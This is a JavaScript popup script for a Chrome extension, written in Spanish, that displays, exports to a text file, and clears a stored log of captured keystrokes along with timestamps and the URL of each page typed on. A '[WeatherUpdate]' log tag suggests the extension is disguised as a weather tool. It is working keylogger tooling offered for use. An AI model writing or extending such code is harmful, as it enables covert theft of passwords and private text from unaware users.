
function cargarHistorial() {
    chrome.storage.local.get({ keystrokes: [] }, function(result) {
        const historial = result.keystrokes;
        const contenedor = document.getElementById('historial');

        if (historial.length === 0) {
            contenedor.innerHTML = '<em>No hay teclas capturadas.</em>';
            return;
        }

        const ultimas = historial.slice(-50).reverse();
        contenedor.innerHTML = ultimas.map(function(t) {
            const fecha = new Date(t.timestamp).toLocaleTimeString();
            return `
                <div class="tecla">
                    <span class="key">${t.key}</span>
                    <span class="url">[${fecha}] ${t.url.substring(0, 40)}...</span>
                </div>
            `;
        }).join('');
    });
}


cargarHistorial();


document.getElementById('btnActualizar').addEventListener('click', function() {
    cargarHistorial();
});


document.getElementById('btnExportar').addEventListener('click', function() {
    chrome.storage.local.get({ keystrokes: [] }, function(result) {
        const historial = result.keystrokes;

        if (historial.length === 0) {
            alert('No hay teclas para exportar.');
            return;
        }


        let contenido = '';
        contenido += '=== HISTORIAL DE TECLAS ===\n';
        contenido += `Exportado: ${new Date().toLocaleString()}\n`;
        contenido += `Total de teclas: ${historial.length}\n`;
        contenido += '========================================\n\n';

        historial.forEach(function(t) {
            const fecha = new Date(t.timestamp).toLocaleString();
            contenido += `[${fecha}] ${t.key} (${t.code}) - ${t.url}\n`;
        });


        const blob = new Blob([contenido], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = `historial_teclas_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        console.log('[WeatherUpdate] Historial exportado:', historial.length, 'teclas');
    });
});


document.getElementById('btnLimpiar').addEventListener('click', function() {
    if (confirm('¿Borrar todo el historial?')) {
        chrome.storage.local.set({ keystrokes: [] }, function() {
            document.getElementById('historial').innerHTML = '<em>Historial limpiado.</em>';
        });
    }
});